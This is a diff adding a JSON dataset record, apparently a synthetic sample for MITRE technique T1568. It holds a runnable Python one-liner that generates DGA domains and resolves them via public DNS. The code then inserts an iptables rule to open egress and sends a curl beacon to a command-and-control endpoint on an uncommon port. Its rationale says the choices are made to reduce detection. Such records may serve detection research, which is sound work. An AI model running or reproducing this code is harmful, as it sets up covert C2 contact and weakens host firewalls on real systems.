@@ -1,0 +1,23 @@
+{
+  "technique_id": "T1568",
+  "platform": "Linux",
+  "shell": "Python",
+  "command": "python3 -c \"import random,datetime,hashlib,subprocess; from scapy.all import IP,UDP,DNS,DNSQR,sr1\nseed='ops-key'; tlds=['com','net','org','biz']\ndef dga(n):\n    base=str(datetime.datetime.utcnow().date())+seed\n    return [hashlib.sha256((base+str(i)).encode()).hexdigest()[:12]+'.'+tlds[i%len(tlds)] for i in range(n)]\nresolvers=['8.8.8.8','1.1.1.1']\nip=None; dom=None; port=random.choice([8443,2053,8088,10443])\nfor d in dga(20):\n    got=False\n    for r in resolvers:\n        resp=sr1(IP(dst=r)/UDP(dport=53)/DNS(rd=1,qd=DNSQR(qname=d,qtype='A')),timeout=2,verbose=0)\n        if resp and resp[DNS] and resp[DNS].an:\n            for a in resp[DNS].an:\n                if getattr(a,'type',0)==1:\n                    ip=a.rdata; dom=d; got=True; break\n        if got: break\n    if got: break\nif ip and dom:\n    subprocess.run(['iptables','-I','OUTPUT','-p','tcp','-d',ip,'--dport',str(port),'-j','ACCEPT'])\n    subprocess.run(['curl','-sS','--connect-timeout','3','-A','curl/7.79',f'http://{dom}:{port}/ping'])\n    print(dom,ip,port)\"",
+  "explanation": "Generates DGA domains, resolves one via DNS, then whitelists and probes an irregular high-port C2 endpoint to reduce detection.",
+  "rationale_steps": [
+    "Use DGA seeded by current UTC date to create ephemeral domains.",
+    "Resolve candidates with scapy DNS queries against multiple public resolvers.",
+    "Pick first A record and open egress via iptables only to that IP and a high, uncommon port.",
+    "Validate reachability with a curl beacon using a benign user agent."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-PYTHON-T1568-c17789a5-c0ea71a4",
+  "source_prompt_hash": "c17789a5",
+  "timestamp_utc": "2025-09-30T09:50:51.932802Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judge": null,
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
